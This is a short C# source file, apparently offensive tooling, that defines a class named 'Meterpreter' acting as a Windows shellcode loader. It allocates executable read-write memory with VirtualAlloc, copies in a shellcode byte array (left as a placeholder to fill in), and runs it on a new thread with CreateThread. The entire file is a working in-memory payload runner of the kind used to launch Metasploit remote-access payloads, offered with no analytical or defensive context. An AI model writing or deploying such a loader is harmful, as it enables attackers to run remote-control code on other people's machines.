using System;
using System.Runtime.InteropServices;

public class Meterpreter
{
    private static UInt32 MEM_COMMIT = 0x1000, PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32.dll")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32.dll")]
    private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr handle);
    [DllImport("kernel32.dll")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string moduleName);
    [DllImport("kernel32.dll")]
    private static extern UInt32 GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    private static extern UInt32 LoadLibrary(string lpFileName);
    [DllImport("kernel32.dll")]
    private static extern UInt32 GetLastError();

    
    public Meterpreter()
    {
        byte[] shellcode = new byte[] { /* < ENTER SHELL CODE HERE > */ };

        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
        IntPtr hThread = IntPtr.Zero;
        UInt32 threadId = 0;
        
        // prepare data
        IntPtr pinfo = IntPtr.Zero;

        // execute native code
        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}